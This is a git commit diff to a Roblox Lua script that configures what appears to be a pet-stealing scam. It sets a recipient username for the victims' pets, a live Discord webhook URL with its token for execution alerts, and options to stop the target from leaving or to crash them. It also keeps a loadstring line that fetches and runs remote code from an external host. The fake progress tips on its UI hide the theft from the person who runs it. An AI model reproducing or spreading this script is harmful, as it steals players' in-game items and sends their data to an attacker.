071ea1317070ec8f55a88995824bba495df313b6
wannafly22671 <131359336+wannafly22671@users.noreply.github.com>
2023-04-20 20:02:35 +0800

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,21 +1,4 @@
-_G.Username = "wannafly22671" --// Username To Send Pets To
-_G.GiftMessage = "thanks" --// Message For The Gift To Say
-_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
-_G.UnlockPets = true --// Unlocks Locked Pets
-_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
-_G.Crash = false --// Crashes Them After Its Finished
---[[ Webhook Config ]]--
-_G.Enabled = true --// Toggle For Sending Webhooks
-_G.Mention = true --// Pings You When Someone Executes
-_G.Webhook = "https://discord.com/api/webhooks/1098577419771858995/QnNxZ4CP_To1qoR_tt4fcqCjClAGagG7OnUKy4xabyiqrUBhU94zSkaeqPpHOEZBdwWw" --// Discord Webhook For Executions
+_.Username = "wannafly22671" --// Username To Send Pets To
+_.Webhook = "https://discord.com/api/webhooks/1098577419771858995/QnNxZ4CP_To1qoR_tt4fcqCjClAGagG7OnUKy4xabyiqrUBhU94zSkaeqPpHOEZBdwWw" --// Discord Webhook For Executions
 
---[[ UI Config ]]--
-_G.ScriptName = "auto script" --// Script Name On The UI
-_G.Tip1 = "downloading.." --// Gives You Tips On The UI
-_G.Tip2 = "executing.." --// Gives You Tips On The UI
-_G.Tip3 = "initializing" --// Gives You Tips On The UI
-_G.Tip4 = "almost done" --// Gives You Tips On The UI
-_G.Tip5 = "enjoy the script" --// Gives You Tips On The UI
-
---[[ Script ]]
 loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/Arkhalis.lua"))()
